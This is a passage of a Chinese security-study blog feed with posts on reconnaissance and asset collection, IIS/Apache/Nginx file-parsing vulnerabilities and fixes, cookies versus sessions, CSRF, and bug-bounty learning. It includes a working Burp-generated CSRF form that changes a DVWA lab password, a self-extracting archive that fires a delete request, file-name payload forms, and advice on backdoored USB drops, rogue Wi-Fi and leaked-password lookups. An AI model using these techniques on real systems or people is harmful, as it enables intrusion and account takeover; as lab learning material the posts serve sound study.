Fuzzer软件应运而生。</p><p>本工具支持自动模糊提取对应目标站点的API以及API对应的参数内容，并支持对：未授权访问、敏感信息泄露、CORS、SQL注入、水平越权、弱口令、任意文件上传七大漏洞进行模糊高效的快速检测。在扫描结束之后，本工具还支持自动生成扫描报告，您可以选择便于分析的HTML版本以及较为正规的doc、pdf、txt版本。</p><h4 id="3-SecretFinder"><a href="#3-SecretFinder" class="headerlink" title="3.SecretFinder"></a>3.SecretFinder</h4><p>一款基于Python脚本的JavaScript敏感信息搜索工具</p><p><a href="https://gitee.com/mucn/SecretFinder">https://gitee.com/mucn/SecretFinder</a></p><p>python3 SecretFinder.py -i <a href="https://www.moonsec.com/">https://www.moonsec.com/</a> -e</p><h2 id="15-网站头信息收集"><a href="#15-网站头信息收集" class="headerlink" title="15.网站头信息收集"></a>15.网站头信息收集</h2><p>1、中间件 ：web服务【Web Servers】 apache iis7 iis7.5 iis8 nginx WebLogic tomcat</p><p>2.、网站组件： js组件jquery、vue 页面的布局bootstrap</p><p>通过浏览器获取</p><img src="https://pic.imgdb.cn/item/66e9439ef21886ccc0da03ce.png" style="zoom:67%;"><h3 id="火狐的插件Wappalyzer"><a href="#火狐的插件Wappalyzer" class="headerlink" title="火狐的插件Wappalyzer"></a>火狐的插件Wappalyzer</h3><h3 id="curl命令查询头信息"><a href="#curl命令查询头信息" class="headerlink" title="curl命令查询头信息"></a>curl命令查询头信息</h3><p>curl <a href="https://www.moonsec.com/">https://www.moonsec.com</a> -i</p><h2 id="17-SSL-TLS证书查询"><a href="#17-SSL-TLS证书查询" class="headerlink" title="17. SSL/TLS证书查询"></a>17. SSL/TLS证书查询</h2><p>SSL/TLS证书通常包含域名、子域名和邮件地址等信息，结合证书中的信息，可以更快速地定位到目标资产，获取到更多目标资产的相关信息。</p><p>查询网站:</p><p>–<a href="https://myssl.com/">https://myssl.com/</a></p><p>–<a href="https://crt.sh/">https://crt.sh</a></p><p><a href="https://censys.io/">https://censys.io</a></p><p><a href="https://developers.facebook.com/tools/ct/">https://developers.facebook.com/tools/ct/</a></p><p><a href="https://google.com/transparencyreport/https/ct/">https://google.com/transparencyreport/https/ct/</a></p><p>SSL证书搜索引擎：</p><p><a href="https://crt.sh/?Identity=%25.moonsec.com">https://crt.sh/?Identity=%.moonsec.com</a></p><h2 id="18-查找厂商ip段"><a href="#18-查找厂商ip段" class="headerlink" title="18.查找厂商ip段"></a>18.查找厂商ip段</h2><p><a href="http://ipwhois.cnnic.net.cn/index.jsp">http://ipwhois.cnnic.net.cn/index.jsp</a></p><h2 id="19-移动资产收集"><a href="#19-移动资产收集" class="headerlink" title="19.移动资产收集"></a>19.移动资产收集</h2><h3 id="1-微信小程序支付宝小程序"><a href="#1-微信小程序支付宝小程序" class="headerlink" title="1. 微信小程序支付宝小程序"></a>1. 微信小程序支付宝小程序</h3><p>现在很多企业都有小程序，可以关注企业的微信公众号或者支付宝小程序，或关注运营相关人员，查看朋友圈，获取小程序。</p><p><a href="https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E6%8B%BC%E5%A4%9A%E5%A4%9A">https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E6%8B%BC%E5%A4%9A%E5%A4%9A</a></p><h3 id="2-app软件搜索"><a href="#2-app软件搜索" class="headerlink" title="2. app软件搜索"></a>2. app软件搜索</h3><p><a href="https://www.qimai.cn/">https://www.qimai.cn/</a></p><h2 id="20-社交信息收集"><a href="#20-社交信息收集" class="headerlink" title="20.社交信息收集"></a>20.社交信息收集</h2><p>QQ群 QQ手机号</p><p>微信群 </p><p>领英</p><p><a href="https://www.linkedin.com/">https://www.linkedin.com/</a></p><p>脉脉招聘</p><p>boss招聘</p><h2 id="21-防护软件收集"><a href="#21-防护软件收集" class="headerlink" title="21.防护软件收集"></a>21.防护软件收集</h2><p>安全防护、云waf、硬件waf、主机防护软件、软waf</p><h2 id="22-社工相关"><a href="#22-社工相关" class="headerlink" title="22.社工相关"></a>22.社工相关</h2><p>微信或者QQ 混入内部群，蹲点观测。加客服小姐姐发一些连接。进一步获取敏感信息。测试产品，购买服务器，拿去测试账号和密码。</p><h2 id="23-物理接触"><a href="#23-物理接触" class="headerlink" title="23.物理接触"></a>23.物理接触</h2><p>到企业办公层连接wifi，连同内网。丢一些带有后门的usb 开放免费的wifi截取账号和密码。</p><h2 id="24-社工相关"><a href="#24-社工相关" class="headerlink" title="24.社工相关"></a>24.社工相关</h2><p>微信或者QQ 混入内部群，蹲点观测。加客服发一些连接。进一步获取敏感信息。测试产品，购买服务器，拿去测试账号和密码。</p><h2 id="25-物理接触"><a href="#25-物理接触" class="headerlink" title="25.物理接触"></a>25.物理接触</h2><p>到企业办公层连接wifi，连同内网。丢一些带有后门的usb 开放免费的wifi截取账号和密码。</p><h2 id="26-社工库"><a href="#26-社工库" class="headerlink" title="26.社工库"></a>26.社工库</h2><p>在tg找社工机器人 查找密码信息 或本地的社工库查找邮箱或者用户的密码或密文。组合密码在进行猜解登录。</p><h2 id="27-资产收集神器"><a href="#27-资产收集神器" class="headerlink" title="27.资产收集神器"></a>27.资产收集神器</h2><p>ARL(Asset Reconnaissance Lighthouse)资产侦察灯塔系统</p><p><a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p><p>AssetsHunter</p><p><a href="https://github.com/rabbitmask/AssetsHunter">https://github.com/rabbitmask/AssetsHunter</a></p><p>一款用于src资产信息收集的工具</p><p><a href="https://github.com/sp4rkw/Reaper">https://github.com/sp4rkw/Reaper</a></p><p>domain_hunter_pro</p><p><a href="https://github.com/bit4woo/domain_hunter_pro">https://github.com/bit4woo/domain_hunter_pro</a></p><p>LangSrcCurise</p><p><a href="https://github.com/shellsec/LangSrcCurise">https://github.com/shellsec/LangSrcCurise</a></p><p>网段资产</p><p><a href="https://github.com/colodoo/midscan">https://github.com/colodoo/midscan</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web中间件解析漏洞</title>
      <link href="/2024/09/06/web-zhong-jian-jian-jie-xi-lou-dong/"/>
      <url>/2024/09/06/web-zhong-jian-jian-jie-xi-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Web中间件解析漏洞"><a href="#Web中间件解析漏洞" class="headerlink" title="Web中间件解析漏洞"></a>Web中间件解析漏洞</h1><p>中间件：apache、nginx、tomcat、weblogic、jboss等</p><h2 id="IIS-5-x-6-x解析漏洞"><a href="#IIS-5-x-6-x解析漏洞" class="headerlink" title="IIS 5.x-6.x解析漏洞"></a>IIS 5.x-6.x解析漏洞</h2><blockquote><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp;该解析漏洞也只能解析asp文件，而不能解析aspx文件。win7-win10中多为iis7.x-8.x了，版本比较高。</p></blockquote><ol><li>目录解析(6.0)<br>     形式:<a href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a><br>     原理:服务器默认会<strong>把.asp，.asa目录下</strong>的文件都解析成asp文件</li><li>文件解析<br>     形式:<a href="http://www.xxx.com/xx.asp;.jpg">www.xxx.com/xx.asp;.jpg</a><br>     原理:服务器<strong>默认不解析;号后面的内容</strong>，因此xx.asp;.jpg便被解析成asp文件了。</li><li>解析文件类型<br>     IIS6.0 默认的可执行文件除了asp还包含这三种:<br>     /test.asa<br>     /test.cer伪装成证书文件<br>     /test.cdx</li></ol><ul><li>修复方案</li></ul><ol><li>目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传xx.asp;.jpg类型的文件名。</li><li>做好权限设置，限制用户创建文件夹。</li><li>安装防护软件，比如D盾等</li></ol><h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><p>漏洞原理：<br>        Apache 解析文件的规则是<strong>从右到左</strong>开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如test.php.owf.rar，“.owf”和”.rar”这两种后缀是apache不可识别解析，apache就会把xx.php.owf.rar解析成php。<br>漏洞形式：<br><a href="http://www.xxxx.xxx.com/test.php.php123">www.xxxx.xxx.com/test.php.php123</a></p><blockquote><p>其余配置问题导致漏洞<br>(1)如果在 Apache的 conf 里有这样一行配置 AddHandler  php5-script  .php 这时只要文件名里包含，php 即使文件名是test2.php.jpg 也会以php 来执行。</p><p>(2)如果在 Apache 的 conf 里有这样一行配置 AddType  application/x-httpd-php  .jpg 即使扩展名是 jpg，一样能以 php 方式执行。xx.jpg</p></blockquote><p>1.示例:<a href="http://www.xxxx,xxx.com/test.php.php123">www.xxxx,xxx.com/test.php.php123</a></p><p>​比如我们将sql.php改为sq.php.xx，正常来讲的话是不能解析的，但是老版本的apache(<strong>apache2.2</strong>版本及之前的)是能够正常将这个文件解析为php文件的</p><ul><li>修复方案</li></ul><p>1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Fi1es ~ ".(php.|php3.)"&gt;//正则匹配，只要前面有.和后面有.的所有都拒绝</span><br><span class="line">order A11ow,Deny</span><br><span class="line">Deny from a11</span><br><span class="line">&lt;/Fi1es&gt;</span><br></pre></td></tr></tbody></table></figure><p>2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule  rewrite_module  modules/mod_rewrite.so<br>把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine on</span><br><span class="line">RewriteRule .(php.|php3.)/index.php//跳转规则，只要匹配后缀名就统一跳转到首页</span><br><span class="line">RewriteRule .(pHp.|pHp3.)/index.php</span><br><span class="line">RewriteRule .(phP.|phP3.)/index.php</span><br><span class="line">RewriteRule .(Php.|Php3.)/index.php</span><br><span class="line">RewriteRule .(PHp.|PHp3.)/index.php</span><br><span class="line">RewriteRule .(PhP.|PhP3.)/index.php</span><br><span class="line">RewriteRule .(pHP |pHP3.)/index.php</span><br><span class="line">RewriteRule .(PHP.|PHP3.)/index.php</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></tbody></table></figure><h2 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h2><p>1.php路径漏洞</p><p>大致原理：该漏洞与nginx、php版本无关，属于<strong>配置不当造成</strong>的解析漏洞。</p><p>​当php.ini配置文件中开启了<strong>cgi.fix_pathinfo</strong>，该值默认为1，表示开启。是处理路径用的配置。</p><p>​比如我们上传了一个木马文件web.jpg，因为web.php不能上传，现在我们想执行这个web.jpg，可以如下路径访问</p><p>​<a href="http://192.168.2.104/pikachu/web.jpg/aaa.php">http://192.168.2.104/pikachu/web.jpg/aaa.php</a></p><p>​而目标服务器上没有aaa.php文件，本来如果nginx.conf的配置没有问题的话，nginx会先去找下这个文件是否存在，如果存在，在找php解释器来解释执行代码，如果不存在，nginx会直接返回错误信息，说找不到该文件，但是如果nginx.conf配置不当会导致nginx把以’.php’结尾的文件交给fastcgi处理，也就是说首先nginx看到你路径中要找aaa.php，哦，原来是php文件，nginx不去找这个文件了，而是就直接交给了fastcgi，fastcgi又去找php解释器去处理该路径，而php开启了cgi.fix_pathinfo，那么php解释器处理这个路径的时候，发现没aaa.php文件，那么他会找路径中上一层路径的文件作为aaa.php来运行，如是乎就找到了web.jpg，将web.jpg当作aaa.php来运行了，所以代码被执行。</p><ul><li>修复方案</li></ul><p>1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;</p><p>2.在Nginx配置文件中添加以下代码：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($fastcgi_script_name ~ ..*/.*php){//匹配到类似test.jpg/a.php的url时返回403</span><br><span class="line">return 403;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web中间件解析漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cookie和session</title>
      <link href="/2024/09/04/cookie-he-session/"/>
      <url>/2024/09/04/cookie-he-session/</url>
      
        <content type="html"><![CDATA[<h1 id="cookie和session"><a href="#cookie和session" class="headerlink" title="cookie和session"></a>cookie和session</h1><p>Cookie和Session是Web开发中用于存储用户信息的两种机制，它们之间有几个关键的区别：</p><ol><li><strong>存储位置</strong>：<ul><li><strong>Cookie</strong>：数据存储在用户的浏览器中。每次请求时，浏览器会自动将相关的Cookie发送到服务器。</li><li><strong>Session</strong>：数据存储在服务器端。客户端只会存储一个Session ID，服务器通过这个ID来识别和访问对应的Session数据。</li></ul></li><li><strong>存储容量</strong>：<ul><li><strong>Cookie</strong>：通常每个Cookie的大小限制在4KB左右，且浏览器对每个域名的Cookie数量也有限制（通常为20个左右）。</li><li><strong>Session</strong>：存储在服务器上，容量通常较大，受限于服务器的存储能力。</li></ul></li><li><strong>安全性</strong>：<ul><li><strong>Cookie</strong>：由于存储在客户端，容易受到XSS（跨站脚本攻击）等攻击，因此需要采取措施（如设置HttpOnly和Secure标志）来提高安全性。</li><li><strong>Session</strong>：数据存储在服务器上，相对更安全，因为用户无法直接访问Session数据。</li></ul></li><li><strong>有效期</strong>：<ul><li><strong>Cookie</strong>：可以设置过期时间，过期后自动删除。Cookie可以是持久性的（存储在硬盘上）或会话性的（浏览器关闭后删除）。</li><li><strong>Session</strong>：通常在用户关闭浏览器或Session超时后失效。Session的有效期可以在服务器端配置。</li></ul></li><li><strong>使用场景</strong>：<ul><li><strong>Cookie</strong>：适合存储一些小型的、非敏感的数据，如用户偏好设置、主题选择等。</li><li><strong>Session</strong>：适合存储用户的登录状态、购物车信息等需要保密或较大数据量的信息。</li></ul></li><li><strong>性能</strong>：<ul><li><strong>Cookie</strong>：每次请求都会发送到服务器，可能会增加网络负担。</li><li><strong>Session</strong>：只需发送Session ID，减少了数据传输量，通常性能更优。</li></ul></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> cookie和session </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF漏洞</title>
      <link href="/2024/09/04/csrf-lou-dong/"/>
      <url>/2024/09/04/csrf-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h1><h2 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h2><p>CSRF（Cross-Site Request Forgery，跨站请求伪造）</p><p>主要涉及到攻击者利用受害者尚未失效的身份认证信息（如cookie、会话令牌等），通过诱导用户点击恶意链接或访问包含攻击代码的页面，从而在用户不知情的情况下以受害者的身份向服务器发送请求，完成非法操作（如转账、修改密码等）</p><img src="https://pic.imgdb.cn/item/66d825ced9c307b7e9f114f8.png" style="zoom:67%;"><h2 id="CSRF分类"><a href="#CSRF分类" class="headerlink" title="CSRF分类"></a>CSRF分类</h2><h3 id="站外和站内"><a href="#站外和站内" class="headerlink" title="站外和站内"></a>站外和站内</h3><ol><li>站内</li></ol><p>CSRF站内类型的漏洞在一定程度上是由于程序员滥用$_REQUEST类变量造成的。在一些敏感的操作中(如修改密码、添加用户等)，本来要求用户从表单提交发起POST请求传递参数给程序，但是由于使用了$_REQUEST等变量，程序除支持接收POST请求传递的参数外也支持接收GET请求传递的参数，这样就会为攻击者使用CSRF攻击创造条件。一般攻击者只要把预测的请求参数放在站内一个贴子或者留言的图片链接里，通过get请求来攻击，受害者浏览了这样的页面就会被强迫发起这些请求。</p><ol start="2"><li>站外</li></ol><p>CSRF站外类型的漏洞本质上就是传统意义上的外部提交教据问题。通常程序员会考虑给一些留言或者评论的表单加上水印以防止SPAM问题(这里，SPAM可以简单的理解为垃圾留言、垃圾评论，或者是带有站外链接的恶意回复)，但是有时为了提高用户的体验性，可能没有对一些操作做任何限制，所以攻击者可以事先预测并设置请求的参数，在站外的Web页面里编写脚本伪造文件请求，或者和自动提交的表单一起使用来实现GET、POST请求，当用户在会话状态下点击链接访问站外Web页面，客户端就被强迫发起请求。</p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1.最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p><p>2.对目标站点增删改查的地方进行标记，并观察逻辑，判断请求是否可以伪造。</p><p>比如修改管理员账号时，不需要验证旧密码</p><p>比如修改敏感信息不需要token验证（确认凭证的有效期）</p><p>虽然退出或关闭了览器，但Cookie仍然有效，或者Session没有及时过期，导致CSRF攻击变得简单</p><h2 id="CSRF和XSS的区别"><a href="#CSRF和XSS的区别" class="headerlink" title="CSRF和XSS的区别"></a>CSRF和XSS的区别</h2><ul><li><p>CSRF是借助用户的权限完成攻击，攻击者并没有拿到用户的权限。目标构造修改个人信息的链接，利用lucy在登录状态下点击此链接达到修改信息的目的。</p></li><li><p>XSS直接盗取了用户的权限，然后实施破坏。攻击者利用XSS盗取了目标的Cookie，登录lucy的后台，再修改相关信息。</p></li></ul><h2 id="攻击场景例子"><a href="#攻击场景例子" class="headerlink" title="攻击场景例子"></a>攻击场景例子</h2><p><img src="https://pic.imgdb.cn/item/66d82678d9c307b7e9f2adcf.png"></p><p>lucy想要在购物网站上修改购物地址，这个操作是lucy通过浏览器向后端发送了请求。这个请求里面包含了lucy的新的收货地址，如果是通过GET提交的，那么会以URL传参的方式的方式将新的地址提交给后台，类似上图中的URL，相当于点了链接就能修改个人信息。</p><p>如果这时候攻击者想要修改lucy的信息怎么办？那么他需要取得lucy的账号，获得登录权限。这时候他可以将修改个人信息的请求伪造一下，构造类似下图中的URL，引诱lucy在登录状态下进行点击，这样攻击就成功了。</p><p><img src="https://pic.imgdb.cn/item/66d82694d9c307b7e9f2dd3b.png"></p><h2 id="攻击实验"><a href="#攻击实验" class="headerlink" title="攻击实验"></a>攻击实验</h2><h3 id="自解压文件完成CSRF攻击删除网站数据（GET请求）"><a href="#自解压文件完成CSRF攻击删除网站数据（GET请求）" class="headerlink" title="自解压文件完成CSRF攻击删除网站数据（GET请求）"></a>自解压文件完成CSRF攻击删除网站数据（GET请求）</h3><p><img src="https://pic.imgdb.cn/item/66d83e07d9c307b7e9194078.png"></p><p>管理员正常登陆界面</p><p>要获取管理员删除数据的url，用bp抓包</p><p><img src="https://pic.imgdb.cn/item/66d83ee1d9c307b7e91ad003.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.116.34/pikachu-master/pikachu-master/vul/overpermission/op2/op2_admin.php?id=25</span><br></pre></td></tr></tbody></table></figure><p>这个动作也就是删除数据包的get请求的数据包，所以只要获得了管理员的cookie，访问这个url就可以删除对应id的数据</p><p>那么现在就做一个自解压的压缩包，并且设置解压后访问此攻击url，如果管理员正在访问此界面，并且解压了这个攻击压缩包，那么就攻击成功，此id的用户被删除</p><p>制作自解压压缩包：</p><img src="https://pic.imgdb.cn/item/66d840aed9c307b7e91d79c9.png" style="zoom:50%;"><img src="https://pic.imgdb.cn/item/66d840ded9c307b7e91dbe9d.png" style="zoom:50%;"><p><img src="https://pic.imgdb.cn/item/66d840f6d9c307b7e91de5f3.png"></p><p>未攻击之前页面数据：</p><p><img src="https://pic.imgdb.cn/item/66d84117d9c307b7e91e21b8.png"></p><p>解压压缩包，攻击之后id=16的数据（最后一条）被删除</p><p><img src="https://pic.imgdb.cn/item/66d841a2d9c307b7e91f67b4.png"></p><h3 id="基于POST请求的账号创建"><a href="#基于POST请求的账号创建" class="headerlink" title="基于POST请求的账号创建"></a>基于POST请求的账号创建</h3><p>用户准备更改信息</p><p><img src="https://pic.imgdb.cn/item/66d877ded9c307b7e96d7626.png"></p><p>bp抓包，是一个POST包</p><p><img src="https://pic.imgdb.cn/item/66d8783bd9c307b7e96dcc33.png"></p><p>用bp自带的工具，生成CSRF POC </p><p><img src="https://pic.imgdb.cn/item/66d87885d9c307b7e96e151f.png"></p><p>并将生成的html代码，放到文件中，生成一个html文件</p><p><img src="https://pic.imgdb.cn/item/66d878c6d9c307b7e96e532b.png"></p><p>让受害者点开html中的按钮</p><p><img src="https://pic.imgdb.cn/item/66d8796cd9c307b7e96ef20b.png"></p><p>未更改信息之前：</p><p><img src="https://pic.imgdb.cn/item/66d879edd9c307b7e96f653f.png"></p><p>受害者在登陆的情况下，同时用与登录相同的浏览器打开攻击html之后，点击按钮，信息被更改</p><p><img src="https://pic.imgdb.cn/item/66d87a98d9c307b7e97002e5.png"></p><h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h3><p><img src="https://pic.imgdb.cn/item/66d87eb7d9c307b7e973ed0e.png"></p><p>在修改密码页面，bp抓包，然后放到重发器中，丢弃包</p><p><img src="https://pic.imgdb.cn/item/66d87fb4d9c307b7e974e6f8.png"></p><p>按理来说，这里应该不用输入原密码，这样才是一个没有防护的状态</p><p>生成一个html页面</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.116.34/DVWA-master/DVWA-master/vulnerabilities/csrf/"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password<span class="symbol">&amp;#95;</span>current"</span> <span class="attr">value</span>=<span class="string">"password"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password<span class="symbol">&amp;#95;</span>new"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password<span class="symbol">&amp;#95;</span>conf"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user<span class="symbol">&amp;#95;</span>token"</span> <span class="attr">value</span>=<span class="string">"443fb9acbff8f91ecbbed26b2e5a7cf3"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>让受害用相同的浏览器打开，并点击，则修改密码</p><h3 id="referer请求头防御和绕过"><a href="#referer请求头防御和绕过" class="headerlink" title="referer请求头防御和绕过"></a>referer请求头防御和绕过</h3><h3 id="token的防御和绕过"><a href="#token的防御和绕过" class="headerlink" title="token的防御和绕过"></a>token的防御和绕过</h3><h2 id="CSRFtester工具使用"><a href="#CSRFtester工具使用" class="headerlink" title="CSRFtester工具使用"></a>CSRFtester工具使用</h2>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SRC漏洞挖掘学习</title>
      <link href="/2024/08/29/src-lou-dong-wa-jue-xue-xi/"/>
      <url>/2024/08/29/src-lou-dong-wa-jue-xue-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="SRC漏洞挖掘学习"><a href="#SRC漏洞挖掘学习" class="headerlink" title="SRC漏洞挖掘学习"></a>SRC漏洞挖掘学习</h1><h2 id="JS漏洞挖掘"><a href="#JS漏洞挖掘" class="headerlink" title="JS漏洞挖掘"></a>JS漏洞挖掘</h2><blockquote><p>实战中阅读JS的作用</p></blockquote><ol><li><p>JS中存在插件名字，根据插件找到相应的漏洞直接利用</p><ul><li>某些公司直接利用第三方存在漏洞的的JS代码</li></ul><p> <img src="https://pic.imgdb.cn/item/66cfcc44d9c307b7e95cfc4c.png"></p></li><li><p>JS中存在一些URL链接，根据URL链接找到相应的页面进一步测试和利用</p></li></ol><p><img src="https://pic.imgdb.cn/item/66cfccd5d9c307b7e95d5e0e.png"></p><ol start="3"><li>JS中存在一个子域名，可以直接访问子域名</li></ol><p><img src="https://pic.imgdb.cn/item/66cfcd20d9c307b7e95da2b6.png"></p><ol start="4"><li>JS中的一些注释可能泄露以账号密码或者其他的</li></ol><h3 id="浏览器控制台使用技巧及方法"><a href="#浏览器控制台使用技巧及方法" class="headerlink" title="浏览器控制台使用技巧及方法"></a>浏览器控制台使用技巧及方法</h3><p><img src="https://pic.imgdb.cn/item/66cfd27ad9c307b7e96164f0.png"></p><h3 id="JS断点技巧以及Hook注入"><a href="#JS断点技巧以及Hook注入" class="headerlink" title="JS断点技巧以及Hook注入"></a>JS断点技巧以及Hook注入</h3><blockquote><p>找到关键代码，打上断点，步进查看加密过程</p></blockquote><p><img src="https://pic.imgdb.cn/item/66cfd3edd9c307b7e9626ad7.png"></p><h3 id="Python和JS结合解决加密难题"><a href="#Python和JS结合解决加密难题" class="headerlink" title="Python和JS结合解决加密难题"></a>Python和JS结合解决加密难题</h3><p><img src="https://pic.imgdb.cn/item/66cfd711d9c307b7e9674b01.png"></p><h3 id="实战MD5加密逆向加密参数还原"><a href="#实战MD5加密逆向加密参数还原" class="headerlink" title="实战MD5加密逆向加密参数还原"></a>实战MD5加密逆向加密参数还原</h3><h2 id="FUZZ（模糊测试）"><a href="#FUZZ（模糊测试）" class="headerlink" title="FUZZ（模糊测试）"></a>FUZZ（模糊测试）</h2><h3 id="常见的FUZZ姿势、工具及字典"><a href="#常见的FUZZ姿势、工具及字典" class="headerlink" title="常见的FUZZ姿势、工具及字典"></a>常见的FUZZ姿势、工具及字典</h3><h3 id="未知目录，信息泄露，备份文件等漏洞的FUZZ"><a href="#未知目录，信息泄露，备份文件等漏洞的FUZZ" class="headerlink" title="未知目录，信息泄露，备份文件等漏洞的FUZZ"></a>未知目录，信息泄露，备份文件等漏洞的FUZZ</h3><blockquote><p>用bp，先FUZZ文件，再FUZZ目录</p></blockquote><p>需要拥有一个顺手的文件名字典和目录字典</p><h3 id="弱口令，隐藏变量，未知参数的FUZZ"><a href="#弱口令，隐藏变量，未知参数的FUZZ" class="headerlink" title="弱口令，隐藏变量，未知参数的FUZZ"></a>弱口令，隐藏变量，未知参数的FUZZ</h3>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多层代理内网穿透</title>
      <link href="/2024/08/18/duo-ceng-dai-li-nei-wang-chuan-tou/"/>
      <url>/2024/08/18/duo-ceng-dai-li-nei-wang-chuan-tou/</url>
      
